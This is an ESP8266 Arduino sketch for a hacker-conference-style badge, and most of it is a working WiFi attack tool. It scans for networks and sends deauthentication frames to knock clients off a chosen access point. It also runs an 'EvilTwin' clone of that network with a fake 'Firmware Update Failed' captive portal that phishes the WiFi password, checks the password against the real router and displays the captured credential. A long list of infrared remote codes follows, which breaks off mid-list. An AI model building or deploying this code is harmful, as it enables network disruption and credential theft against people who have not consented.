#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClient.h> //from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port
#include <ESP8266mDNS.h> //from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port

//const int SHORT_PRESS_TIME = 3000; // 3 seconds //from https://arduinogetstarted.com/tutorials/arduino-button-long-press-short-press
//const int LONG_PRESS_TIME  = 3000; // 3 seconds //from https://arduinogetstarted.com/tutorials/arduino-button-long-press-short-press

extern "C" {
#include "user_interface.h"
}

#ifndef APSSID
#define APSSID "HHV-Badge"   //Edit to change the SSID
#define APPSK  "12345678"   //Edit to change the password
#endif

const char *ssid = APSSID;
const char *password = APPSK;

/* hostname for mDNS. Should work at least on windows. from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port */
const char *myHostname = "Firmware Update";


//add HHV Badge code
#include "PinDefinitionsAndMore.h"  // Define macros for input and output pin etc.

#define DISABLE_CODE_FOR_RECEIVER // Disables restarting receiver after each send. 

#include <IRremote.hpp>

int Led_Red = D2; //set digital pin for red
int Led_Green = D3; //set digital pin for green
int Led_Blue = D0; //set digital pin for blue

int button = D1; //D7(gpio13)
//ezButton button(D1); // create ezButton object that attach to pin 5 (D1); //from https://arduinogetstarted.com/tutorials/arduino-button-long-press-short-press

// Variables will change:
int lastState = LOW;  // the previous state from the input pin
int currentState;     // the current reading from the input pin
//unsigned long pressedTime  = 0; //from https://arduinogetstarted.com/tutorials/arduino-button-long-press-short-press
//unsigned long releasedTime = 0; //from https://arduinogetstarted.com/tutorials/arduino-button-long-press-short-press

int buttonState=0;

//int randR;
//int randG;
//int randB;
 
byte lastButtonState = LOW;
byte ledState = LOW;
//end HHV Badge code




typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
//IPAddress apIP(192, 168, 1, 1);
IPAddress apIP(8, 8, 8, 8); //from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

bool wifi_active = true;

//start from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port
/** Should I connect to WLAN asap? */
boolean connect;

/** Last time I tried to connect to WLAN */
unsigned long lastConnectTry = 0;

/** Current WLAN status */
unsigned int status = WL_IDLE_STATUS;

/** Is this an IP? */
boolean isIp(String str) {
  for (size_t i = 0; i < str.length(); i++) {
    int c = str.charAt(i);
    if (c != '.' && (c < '0' || c > '9')) {
      return false;
    }
  }
  return true;
}

/** IP to String? */
String toStringIp(IPAddress ip) {
  String res = "";
  for (int i = 0; i < 3; i++) {
    res += String((ip >> (8 * i)) & 0xFF) + ".";
  }
  res += String(((ip >> 8 * 3)) & 0xFF);
  return res;
}

/** Handle root or redirect to captive portal */


/** Redirect to captive portal if we got a request for another domain. Return true in that case so the page handler do not try to handle the request again. */
boolean captivePortal() {
  if (!isIp(webServer.hostHeader()) && webServer.hostHeader() != (String(myHostname) + ".local")) {
    Serial.println("Request redirected to captive portal");
    webServer.sendHeader("Location", String("http://") + toStringIp(webServer.client().localIP()), true);
    webServer.send(302, "text/plain", "");   // Empty content inhibits Content-length header so we have to close the socket ourselves.
    webServer.client().stop(); // Stop is needed because we sent no content length
    return true;
  }
  return false;
}

void handleNotFound() {
  if (captivePortal()) { // If caprive portal redirect instead of displaying the error page.
    return;
  }
  String message = F("File Not Found\n\n");
  message += F("URI: ");
  message += webServer.uri();
  message += F("\nMethod: ");
  message += (webServer.method() == HTTP_GET) ? "GET" : "POST";
  message += F("\nArguments: ");
  message += webServer.args();
  message += F("\n");

  for (uint8_t i = 0; i < webServer.args(); i++) {
    message += String(F(" ")) + webServer.argName(i) + F(": ") + webServer.arg(i) + F("\n");
  }
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");
  webServer.send(404, "text/plain", message);
}
//end from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port




void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               ;
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
}

void setup() {

  Serial.begin(115200);

  //button.setDebounceTime(50); // set debounce time to 50 milliseconds from https://arduinogetstarted.com/tutorials/arduino-button-long-press-short-press


  //add HHV badge code
  pinMode(Led_Red, OUTPUT); 
  pinMode(Led_Green, OUTPUT); 
  pinMode(Led_Blue, OUTPUT); 
  randomSeed(analogRead(0));

  // initialize digital pin LED_BUILTIN as an output.
  pinMode(LED_BUILTIN, OUTPUT);

  //initialize button
  pinMode(button, INPUT);

  #if defined(IR_SEND_PIN)
      IrSender.begin(); // Start with IR_SEND_PIN as send pin and enable feedback LED at default feedback LED pin
  #  if defined(IR_SEND_PIN_STRING)
      Serial.println(F("Send IR signals at pin " IR_SEND_PIN_STRING));
  #  else
      Serial.println(F("Send IR signals at pin " STR(IR_SEND_PIN)));
  #  endif
  #else
      IrSender.begin(3, ENABLE_LED_FEEDBACK, USE_DEFAULT_FEEDBACK_LED_PIN); // Specify send pin and enable feedback LED at default feedback LED pin
      //Serial.println(F("Send IR signals at pin 3"));
  #endif 

  analogWrite (Led_Red, 0);
  analogWrite (Led_Blue, 0);
  analogWrite (Led_Green, 0);
  //end HHV Badge Code

  Serial.println("wifi_active is:");
  Serial.println(wifi_active);

  WiFi.mode(WIFI_AP_STA); //ESP8266 in Both Mode AccesssPoint and Station mode
  wifi_promiscuous_enable(1);  //setup ESP8266 in prrmiscuous mode
  WiFi.softAPConfig(apIP , apIP , IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, password);
  delay(500); // Without delay I've seen the IP address blank from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port 
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError); //from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port 
  dnsServer.start(DNS_PORT, "*", apIP);

  /* Setup the DNS server redirecting all the domains to the apIP */
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError); //from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port 
  dnsServer.start(DNS_PORT, "*", apIP); //from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port 

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/turnoffwifi", turnoffwifi);
  webServer.on("/generate_204", handleIndex);  //Android captive portal. Maybe not needed. Might be handled by notFound handler. from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port
  webServer.onNotFound(handleNotFound); //from https://stackoverflow.com/questions/54583818/esp-auto-login-accept-message-by-os-with-redirect-to-page-like-public-wifi-port 
  webServer.begin();

  wifi_active = true;

}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;




void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(apIP , apIP , IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid, password);
    dnsServer.start(DNS_PORT, "*", apIP);
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/'>"
                   "<button style='display:inline-block;'>Refresh</button></form>"
                   "<form style='display:inline-block;' method='post' action='/turnoffwifi'>"
                   "<button style='display:inline-block; padding-left:8px;'>Turn Off Wifi</button></form></div>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig( apIP , apIP , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(apIP , apIP , IPAddress(255, 255, 255, 0));
      WiFi.softAP(ssid, password);
      dnsServer.start(DNS_PORT, "*", apIP);
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
      //webServer.send(200, "text/html", index());   //MAIN PAGE OF CAPTIVE PORTAL ORIGINAL CODE, REPLACED WITH THE NEXT 7 LINES
      if (captivePortal()) { // If caprive portal redirect instead of displaying the page.
        return;
      }
      webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
      webServer.sendHeader("Pragma", "no-cache");
      webServer.sendHeader("Expires", "-1");
      webServer.send(200, "text/html", index());


    }
  }

}

void turnoffwifi() {
  
  deauthing_active =false;
  hotspot_active = false;
  wifi_active = false;
  WiFi.mode(WIFI_OFF);
  Serial.println("wifi off");

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(apIP , apIP , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(apIP , apIP , IPAddress(255, 255, 255, 0));
      WiFi.softAP(ssid, password);
      dnsServer.start(DNS_PORT, "*", apIP);
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  //button.loop(); // MUST call the loop() function first https://arduinogetstarted.com/tutorials/arduino-button-long-press-short-press


  if (wifi_active) {
    dnsServer.processNextRequest();
    webServer.handleClient();

    if (deauthing_active && millis() - deauth_now >= 1000) {

      wifi_set_channel(_selectedNetwork.ch);

      uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

      memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
      memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
      deauthPacket[24] = 1;

      Serial.println(bytesToStr(deauthPacket, 26));
      deauthPacket[0] = 0xC0;
      Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
      Serial.println(bytesToStr(deauthPacket, 26));
      deauthPacket[0] = 0xA0;
      Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

      deauth_now = millis();

    }

    if (millis() - now >= 15000) {
      performScan();
      now = millis();
    }

    if (millis() - wifinow >= 2000) {
      if (WiFi.status() != WL_CONNECTED) {
        Serial.println("BAD");
      } else {
        Serial.println("GOOD");
      }
      wifinow = millis();
    }
  }


  //add HHV badge code  

  if (digitalRead(button) == HIGH) {
    delay(1000);
    if (deauthing_active) {
      Serial.println("deauthing_active is:");
      Serial.println(deauthing_active);
      deauthing_active = false;
      Serial.println("deauthing_active is:");
      Serial.println(deauthing_active);
      analogWrite (Led_Red, 0);
      analogWrite (Led_Blue, 255);
      analogWrite (Led_Green, 0);
    } else if (hotspot_active) {
      Serial.println("hotspot_active is ");
      Serial.println(hotspot_active);
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(apIP , apIP , IPAddress(255, 255, 255, 0));
      WiFi.softAP(ssid, password);
      dnsServer.start(DNS_PORT, "*", apIP);
      Serial.println("hotspot_active is ");
      Serial.println(hotspot_active);
      analogWrite (Led_Red, 0);
      analogWrite (Led_Blue, 255);
      analogWrite (Led_Green, 0);
    } else {
      deauthing_active = false;
      hotspot_active = false;
      Serial.println("SendIRSignal is sent");
      SendIRSignal();
    }
  } else {
    digitalWrite(LED_BUILTIN, LOW);
  }

  if (deauthing_active && wifi_active) {    
    analogWrite (Led_Red, 255);
    analogWrite (Led_Blue, 255);
    analogWrite (Led_Green, 0);
  } else if (hotspot_active && wifi_active) {
    analogWrite (Led_Red, 0);
    analogWrite (Led_Blue, 0);
    analogWrite (Led_Green, 255);
  } else if (wifi_active && !hotspot_active && !deauthing_active) {
    analogWrite (Led_Red, 0);
    analogWrite (Led_Blue, 255);
    analogWrite (Led_Green, 0);
  } else {
    analogWrite (Led_Red, 0);
    analogWrite (Led_Blue, 0);
    analogWrite (Led_Green, 0);    
  }

  //end HHV badge code

}


//HHV Badge Code for sending IR signal
void SendIRSignal()
  {
    //digitalWrite(LED_BUILTIN, HIGH);
    analogWrite (Led_Red, 255);
    analogWrite (Led_Blue, 0);
    analogWrite (Led_Green, 0);

    //commands copied from flipperzero
    IrSender.sendSony(0x1, 0x15, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println("IrSender.sendSony(0x1, 0x15, 2, 12);");
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x15, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println("IrSender.sendSony(0x1, 0x15, 2, 12);");
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x1, 0x15, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x40, 0xB, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendPanasonic(0x8, 0x3D, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x4, 0x40, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x7F00, 0x15, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xDF00, 0x1C, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x1, 0x3, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x3, 0x1D, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x19, 0x18, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xA0BA, 0x4C, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xEDAD, 0xB5, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x1, 0x40, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xB7A0, 0xE9, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x10, 0x15, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x10, 0x15, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSony(0x10, 0x15, 2, 12);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x8, 0x5, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0xDF00, 0x1C, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0xE0E, 0xC, 2);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x707, 0x2, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x50, 0x17, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x4931, 0x63, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xAA, 0x1C, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x38, 0x1C, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x7A83, 0x8, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x53, 0x17, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x1818, 0xC0, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println("IrSender.sendOnkyo(0x1818, 0xC0, 1);");
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x38, 0x10, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xAA, 0xC5, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x4, 0x8, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x18, 0x8, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x71, 0x8, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x6F80, 0xA, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x48, 0x0, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x7B80, 0x13, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x7E80, 0x18, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x50, 0x8, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x7580, 0xA, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x5780, 0xA, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0xB0B, 0xA, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xAA, 0x1B, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x4685, 0x12, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x505, 0x2, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x808, 0xF, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x0, 0x1, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x707, 0xE6, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x71, 0x4A, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x60, 0x3, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x60, 0x0, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x42, 0x1, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    //Serial.println("IrSender.sendNEC(0x42, 0x1, 1);");
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0xAD50, 0x0, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0xAD50, 0x2, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x50, 0x3F, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x606, 0xF, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x8, 0x12, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x808, 0xB, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x5583, 0xC2, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x0, 0x51, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0xBD00, 0x1, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x0, 0xF, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x1616, 0xF, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x1, 0x1, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x6880, 0x49, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendOnkyo(0x286, 0x49, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x7F00, 0xA, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x7201, 0x1E, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x586, 0xF, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x7D02, 0x46, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xE084, 0x20, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x6E, 0x2, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0x7C85, 0x80, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendNEC(0xC7EA, 0x17, 1);
    //delay(50);                // waits 50 milliseconds to let the buffer clear
    IrSender.sendSamsung(0x707, 0xE0, 1);
